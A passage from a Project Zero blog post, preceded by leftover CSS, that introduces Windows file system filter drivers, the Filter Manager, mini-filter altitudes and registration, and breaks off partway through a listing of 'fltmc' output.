2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffe599;border-left-style:solid;border-bottom-width:1pt;width:191.2pt;border-top-color:#000000;border-bottom-style:solid}.c22{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#efefef;border-left-style:solid;border-bottom-width:1pt;width:41.2pt;border-top-color:#000000;border-bottom-style:solid}.c29{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#dd7e6b;border-left-style:solid;border-bottom-width:1pt;width:70.5pt;border-top-color:#000000;border-bottom-style:solid}.c65{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:69pt;border-top-color:#000000;border-bottom-style:solid}.c61{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#efefef;border-left-style:solid;border-bottom-width:1pt;width:156pt;border-top-color:#000000;border-bottom-style:solid}.c59{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:270.8pt;border-top-color:#000000;border-bottom-style:solid}.c78{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:69pt;border-top-color:#000000;border-bottom-style:solid}.c38{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:15.8pt;border-top-color:#000000;border-bottom-style:solid}.c37{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:238.5pt;border-top-color:#000000;border-bottom-style:solid}.c26{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:42pt;border-top-color:#000000;border-bottom-style:solid}.c68{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:191.2pt;border-top-color:#000000;border-bottom-style:solid}.c51{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:16.5pt;border-top-color:#000000;border-bottom-style:solid}.c44{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c28{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:187.5pt;border-top-color:#000000;border-bottom-style:solid}.c81{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:41.2pt;border-top-color:#000000;border-bottom-style:solid}.c41{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:132pt;border-top-color:#000000;border-bottom-style:solid}.c13{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:59.2pt;border-top-color:#000000;border-bottom-style:solid}.c72{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:70.5pt;border-top-color:#000000;border-bottom-style:solid}.c34{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:61.5pt;border-top-color:#000000;border-bottom-style:solid}.c58{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:130.5pt;border-top-color:#000000;border-bottom-style:solid}.c62{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:156pt;border-top-color:#000000;border-bottom-style:solid}.c53{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:189.8pt;border-top-color:#000000;border-bottom-style:solid}.c5{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c47{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c6{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c55{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c14{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c24{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c25{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c19{padding-top:0pt;padding-bottom:0pt;line-height:1.500000000000001;orphans:2;widows:2;text-align:left}.c52{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c9{background-color:#ffffff;font-size:10pt;font-family:"Courier New";color:#000080;font-weight:700}.c2{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c30{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c4{background-color:#ffffff;font-size:10pt;font-family:"Courier New";font-weight:400}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{font-size:10pt;font-family:"Courier New";color:#8b0000;font-weight:400}.c15{border-spacing:0;border-collapse:collapse;margin-right:auto}.c32{background-color:#ffffff;font-family:"Courier New";color:#0000ff;font-weight:700}.c11{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c84{background-color:#ffffff;font-family:"Courier New";font-weight:700}.c40{text-decoration:none;vertical-align:baseline;font-style:normal}.c71{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c31{background-color:#ffffff;font-size:10.5pt;color:#171717}.c50{font-weight:700;font-size:11pt;font-family:"Courier New"}.c10{color:inherit;text-decoration:inherit}.c27{margin-left:36pt;padding-left:0pt}.c70{padding:0;margin:0}.c17{font-weight:400;font-family:"Courier New"}.c56{border:1px solid black;margin:5px}.c60{color:#0000ff}.c75{background-color:#efefef}.c8{height:11pt}.c79{color:#006161}.c80{color:#008000}.c49{background-color:#f4cccc}.c82{height:20.1pt}.c21{font-style:italic}.c69{background-color:#d9d9d9}.c74{color:#6aa84f}.c43{color:#800080}.c76{color:#808080}.c64{background-color:#ffe599}.c42{color:#a82d00}.c66{color:#804000}.c36{color:#ff8000}.c67{background-color:#a4c2f4}.c20{height:0pt}.c83{color:#006400}.c35{color:#696969}.c77{background-color:#ffd966}.c48{color:#8a2be2}.c73{background-color:#b6d7a8}.c45{color:#000080}.c54{color:#8000ff}.c33{background-color:#dd7e6b}.c85{height:27pt}.c57{color:#00008b}.c3{height:15.8pt}.c23{font-size:10pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c71"&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;In December Microsoft fixed 4 issues in Windows in the Cloud Filter and Windows Overlay Filter (WOF) drivers (&lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2086"&gt;CVE-2020-17103&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2084"&gt;CVE-2020-17134&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2082"&gt;CVE-2020-17136&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2088"&gt;CVE-2020-17139&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;). These 4 issues were 3 local privilege escalations and a security feature bypass, and they were all present in Windows file system filter drivers. I&amp;rsquo;ve found a number of issues in filter drivers previously, including 6 in the LUAFV driver which implements UAC file virtualization.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;&amp;nbsp;The purpose of a file system filter driver according to &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/about-file-system-filter-drivers"&gt;Microsoft&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;is:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c52 c21"&gt;&amp;ldquo;A file system filter driver can filter I/O operations for one or more file systems or file system volumes. Depending on the nature of the driver, filter can mean log, observe, modify, or even prevent. Typical applications for file system filter drivers include antivirus utilities, encryption programs, and hierarchical storage management systems.&amp;rdquo;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;What this boils down to is the filter driver can inspect and modify almost any IO request sent to a file system. This power comes with many responsibilities, and considering the complexity of the IO model on Windows it can be hard to avoid introducing subtle bugs.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;With the issues being fixed I thought would be a good opportunity to go into a bit more detail on how you can research file system filter drivers, specifically the kind of things I looked at to find my security vulnerabilities. I&amp;rsquo;m going to give an overview of how filter drivers work, how you communicate with them, some hints on reverse engineering and some of the common security issues you might discover. I&amp;rsquo;ll also provide some basic example code to give you a basic idea of some common coding patterns. The goal is to allow you to do your own research in this area.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;I&amp;rsquo;m assuming you have some prior knowledge on how the IO Manager works and have experience in finding security issues in non-filter drivers. Also I&amp;rsquo;m not claiming this to be an exhaustive description of bug hunting in filter drivers as the topic is very deep and complex. With this in mind let&amp;rsquo;s start with an overview of how a filter driver works.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c55" id="h.xkk5cafwn49p"&gt;&lt;span class="c14"&gt;Filter Driver Implementation&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span&gt;A filter driver exploits the way the Windows IO Manager implements file system drivers. When you make a request to access a file, such as calling the &lt;/span&gt;&lt;span class="c21"&gt;NtCreateFile &lt;/span&gt;&lt;span class="c1"&gt;system call the IO Manager allocates an IO Request Packet (IRP) structure which contains the operation type and all the parameters for the operation. The IRP is then dispatched to the top of the device stack associated with the request.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-ft1Qb-E9rrA/X_9xlhIu_EI/AAAAAAAAaog/B0AV8WsW5wQrUX17mHfM11ku8zUik-7xwCNcBGAsYHQ/s653/Device%2BStack.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-ft1Qb-E9rrA/X_9xlhIu_EI/AAAAAAAAaog/B0AV8WsW5wQrUX17mHfM11ku8zUik-7xwCNcBGAsYHQ/s600/Device%2BStack.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;A filter driver registers for the IO requests it supports with a callback function which is invoked when a specific IO request type IRP is queued in the device stack. The driver callback can then do a number of different things to the IRP.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c70 lst-kix_itnic84mr100-0 start"&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Pass the IRP unmodified directly to the next driver in the stack.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Modify the IRP then pass to the next driver.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Modify the IRP response.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Complete the IRP operation with a success result.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Complete the IRP operation with an error result.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Pass the IRP to a different device stack.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;This is the basics of how a filter driver works, the driver is attached at a suitable point of a device stack and handles IO requests. When an IRP of interest is received it can perform one of the operations to filter requests. If it wants to inspect or modify the response it can register for the completion routine and handle the operation in the callback.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;It&amp;rsquo;s important to note that the IRP doesn&amp;rsquo;t automatically propagate down the stack. A driver can choose to complete the IRP which means it&amp;rsquo;ll not be processed by any other driver down the stack. If the driver passes on the IRP the driver must register a completion routine otherwise it&amp;rsquo;ll not be notified when the IRP has been processed by the lower drivers in the stack. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;For a file system filter the insertion point would typically be on top of the file system device object which is exposed by a file system driver such as NTFS. However, the driver can insert itself almost anywhere, allowing it to filter not just file system requests but also change data such as disk sectors. For example the Bitlocker Full Disk Encryption driver is a filter which is attached to the top of a volume block device. Any sectors passed in a write IRP are encrypted before passing to the lower driver. Read IRPs are handled in a completion routine and the sectors are decrypted before returning to the caller.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c55" id="h.x7y7f8zle74"&gt;&lt;span class="c14"&gt;The Filter Manager and Mini-Filters&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Implementing a filter driver from scratch is quite complicated. You have to handle every single IO request type, even if you don&amp;rsquo;t care about it, so that it can be forwarded to the next driver in the stack. You also have to find the correct point to insert your filter driver into the device stack. It&amp;rsquo;s easy to attach a driver to the top of the stack but trying to insert in the middle of an existing stack can be a recipe for disaster, for example the ordering of the filter drivers in the stack might differ depending on load order.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To make it easier to write a filter driver Windows comes with the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts#:~:text=The%20filter%20manager%20is%20a,in%20file%20system%20filter%20drivers.&amp;text=The%20filter%20manager%20is%20installed,a%20minifilter%20driver%20is%20loaded."&gt;Filter Manager Driver&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;which takes care of handling IO requests and device stacks. This allows a developer to write what&amp;rsquo;s called a mini-filter driver instead of a, now named, legacy filter driver. The following diagram shows how the architecture changes when you introduce the filter manager.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-4xN5FEYoyic/X_9xllA7a3I/AAAAAAAAaok/l8-pMXurJsAmRY6N-2yt_6kPNk9ZnvtXQCNcBGAsYHQ/s820/Mini-Filter%2BDriver.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-4xN5FEYoyic/X_9xllA7a3I/AAAAAAAAaok/l8-pMXurJsAmRY6N-2yt_6kPNk9ZnvtXQCNcBGAsYHQ/s600/Mini-Filter%2BDriver.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;As you can see the mini-filters don&amp;rsquo;t add their own device objects to the stack. Instead they are registered with the filter manager and it&amp;rsquo;s the filter manager which inserts its own device. The filter manager handles the IO requests and calls registered mini-filters to process the request. If your mini-filter doesn&amp;rsquo;t support a certain IO request then the filter manager implements a default which handles passing the IRP on to the next driver in the stack.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;Another useful feature is the filter manager implements a mechanism for ordering the mini-filters, through an altitude value. The higher the altitude value the higher the priority. For example, a filter at altitude 10000 will be called before a filter at altitude 5000 when making a IO request. When handling responses the altitudes processed in reverse order, so the filter at 5000 will be called first then the one at 10000. Officially the altitude values must be &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/minifilter-altitude-request"&gt;registered&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with Microsoft. MSDN contains a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/allocated-altitudes"&gt;list of the currently registered altitudes&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;. However, there&amp;rsquo;s nothing to stop a driver from registering itself with a different altitude except it&amp;rsquo;ll likely draw the ire of Microsoft and might fail certification. By formalizing the altitude values you avoid the risk that a filter driver&amp;rsquo;s ordering may change depending on load order.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c55" id="h.t0ykfnsx6rw0"&gt;&lt;span class="c14"&gt;Mini-Filter Registration&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span&gt;A mini-filter driver registers its presence by calling the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltregisterfilter"&gt;FltRegisterFilter&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;filter manager API, normally during the driver&amp;rsquo;s entry point. The main parameter is a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_registration"&gt;FLT_REGISTRATION&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which defines all the various callbacks for handling IO requests and bookkeeping. The important fields are the callbacks which a driver can register to respond to events from the filter manager. You can view what filters are registered with the filter manager using the &lt;/span&gt;&lt;span class="c21"&gt;fltmc &lt;/span&gt;&lt;span class="c1"&gt;command line tool (must be run as an administrator).&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.013f8fb81fa603dd07a7256d23386722aba151c3"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c17"&gt;C:\&amp;gt; &lt;/span&gt;&lt;span class="c30 c50"&gt;fltmc&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c12"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;Filter Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Num Instances &amp;nbsp; &amp;nbsp;Altitude &amp;nbsp; &amp;nbsp;Frame&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;------------------------------ &amp;nbsp;------------- &amp;nbsp;------------ &amp;nbsp;-----&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;bindflt &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 1 &amp;nbsp; &amp;nbsp; &amp;nbsp; 409800 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;WdFilter &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 17 &amp;nbsp; &amp;nbsp; &amp;nbsp; 328010 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;storqosflt &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;1 &amp;nbsp; &amp;nbsp; &amp;nbsp; 244000 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;wcifs &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 &amp;nbsp; &amp;nbsp; &amp;nbsp; 189900 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;CldFlt &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0 &amp;nbsp; &amp;nbsp; &amp;nbsp; 180451 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;FileCrypt &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 &amp;nbsp; &amp;nbsp; &amp;nbsp; 141100 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;luafv &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 